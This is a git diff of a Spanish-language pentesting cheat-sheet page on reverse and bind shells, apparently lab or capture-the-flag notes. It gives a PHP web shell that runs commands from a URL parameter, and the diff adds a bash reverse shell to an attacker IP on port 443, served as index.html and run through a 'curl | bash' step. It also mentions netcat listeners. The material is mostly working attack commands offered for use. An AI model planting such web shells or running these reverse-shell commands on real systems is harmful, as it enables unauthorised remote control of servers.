@@ -6,7 +6,7 @@ Tenemos diferntes tipos de [1 ReverShell](1%20ReverShell.md) en este pagina Web:
 
 ## ReverShell, BindShell
 Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/var/www/html** con el siguiente contenido: 
-```shell
+```bash
 ❯ nano cmd.php
 	<?php 
 		echo "<prep>" . shell_exec($_GET['cmd']) . "</prep>";
@@ -15,6 +15,19 @@ Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/va
 ```
 Las etiquetas que usamos ahi son **Pre** de preformateadas y nos sirven para que nos muestre bien el Output
 Ya con ese archivo y que la Web interprete **php** podemos colocar en la url **?cmd=** y ahi pode colocar comandos y ver que Shell podriamos usar para conectarmos a nuestra maquina de **Atacante**.
+
+```bash
+❯ nano index.html
+	#!/bin/bash
+	bash -i >& /dev/tcp/10.10.14.2/443 0>&1
+
+	# IP = IP de atacante
+	# 443 = Puerto a usar
+```
+
+```bash
+❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
+```
 
 Para ponernos en escucha por Netcat en espera de la **ReverShell**:
 1) Linux
@@ -61,3 +74,5 @@ Debemos estar en la pestana de **Raw**
 
 ❯ python3 tty_over_http.py 
 ```
+
+
